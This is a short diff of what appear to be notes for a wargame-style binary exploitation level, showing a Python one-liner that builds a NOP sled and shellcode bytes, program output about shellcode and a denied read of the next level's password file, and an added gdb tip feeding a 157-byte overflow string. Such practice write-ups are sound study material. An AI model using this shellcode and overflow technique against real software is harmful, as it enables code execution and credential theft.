@@ -20,3 +20,6 @@ ODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\
 cat: Give me some shellcode, k
 no exec() for you
 /home/users/level05/.pass: Permission denied
+
+
+- run python commands in gdb : `r <<< $(python -c "print 'A'*157")`
